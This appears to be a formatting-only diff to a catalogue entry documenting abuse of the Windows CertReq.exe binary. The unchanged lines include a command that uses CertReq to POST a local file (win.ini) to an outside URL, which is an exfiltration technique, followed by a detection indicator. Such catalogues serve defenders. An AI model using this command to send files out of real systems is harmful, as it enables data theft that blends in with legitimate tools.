@@ -2,7 +2,7 @@
 Name: CertReq.exe
 Description: Used for requesting and managing certificates
 Author: 'David Middlehurst'
-Created: '2020-07-07'
+Created: 2020-07-07
 Commands:
   - Command: CertReq -Post -config https://example.org/ c:\windows\win.ini output.txt
     Description: Save the response from a HTTP POST to the endpoint https://example.org/ as output.txt in the current directory
@@ -23,7 +23,7 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\certreq.exe
   - Path: C:\Windows\SysWOW64\certreq.exe
-Code_Sample: 
+Code_Sample:
   - Code:
 Detection:
   - IOC: certreq creates new files
